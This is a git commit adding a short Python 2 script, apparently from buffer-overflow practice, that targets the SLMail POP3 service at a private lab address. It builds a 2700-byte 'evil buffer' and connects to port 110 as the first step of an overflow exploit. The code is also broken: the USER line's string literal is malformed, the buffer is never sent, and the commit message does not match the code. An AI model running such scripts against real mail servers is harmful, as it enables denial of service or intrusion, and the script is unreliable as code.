4e732b752cfb52122b15ec9fa0ea512ef9deee51
itiswiki <32880445+itiswiki@users.noreply.github.com>
2017-10-18 22:15:13 -0600

    Create slmail-pop3.py
    Sends data to password

---
+++ slmail-pop3.py
@@ -0,0 +1,15 @@
+#!/usr/bin/python
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = 'A' * 2700
+
+try:
+  print "\nSending evil buffer..."
+  s.connect(('10.11.10.12',110))
+  data = s.recv(1024)
+  s.send('USER username' +'r\n\')
+  print "\nDone!."
+except:
+  print "Could not connect to POP3!"
+  
